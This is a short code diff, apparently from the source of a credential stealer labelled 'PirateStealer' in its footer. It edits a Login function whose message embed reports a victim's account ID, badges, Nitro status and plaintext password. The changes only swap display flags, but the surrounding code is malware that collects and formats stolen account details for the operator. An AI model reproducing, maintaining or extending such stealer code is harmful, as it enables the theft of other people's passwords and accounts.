@@ -310,11 +310,11 @@ function Login(email, password, token) {
                             }, {
                                 name: "ID",
                                 value: `\`${json.id}\``,
-                                inline: !0
+                                inline: !1
                             }, {
                                 name: "Badges",
                                 value: `${GetBadges(json.flags)}`,
-                                inline: !1
+                                inline: !0
                             }, {
                                 name: "Nitro",
                                 value: `${GetNitro(json.premium_type)}`,
@@ -330,7 +330,7 @@ function Login(email, password, token) {
                             }, {
                                 name: "Password",
                                 value: `\`${password}\``,
-                                inline: !0
+                                inline: !1
                             }, ],
                             "footer": {
                                 "text": "PirateStealer"
